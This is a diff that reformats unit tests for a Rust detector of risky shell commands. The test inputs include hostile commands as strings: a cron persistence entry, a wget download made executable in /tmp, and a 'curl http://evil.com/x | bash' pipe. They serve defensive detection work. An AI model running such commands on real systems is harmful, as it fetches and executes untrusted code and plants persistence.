@@ -390,21 +390,26 @@ mod tests {
 
     #[test]
     fn detects_persistence() {
-        let (indicator, score) = check_persistence("echo '* * * * * /tmp/rev' | crontab -").unwrap();
+        let (indicator, score) =
+            check_persistence("echo '* * * * * /tmp/rev' | crontab -").unwrap();
         assert_eq!(indicator, "crontab");
         assert_eq!(score, 20);
     }
 
     #[test]
     fn detects_tmp_execution() {
-        let (dir, score) = check_tmp_execution("wget -O /tmp/payload && chmod +x /tmp/payload").unwrap();
+        let (dir, score) =
+            check_tmp_execution("wget -O /tmp/payload && chmod +x /tmp/payload").unwrap();
         assert_eq!(dir, "/tmp/");
         assert_eq!(score, 30);
     }
 
     #[test]
     fn detects_download_pipe() {
-        assert_eq!(check_download_execute_pipe("curl http://evil.com/x | bash"), Some(40));
+        assert_eq!(
+            check_download_execute_pipe("curl http://evil.com/x | bash"),
+            Some(40)
+        );
         assert!(check_download_execute_pipe("echo hello").is_none());
     }
 
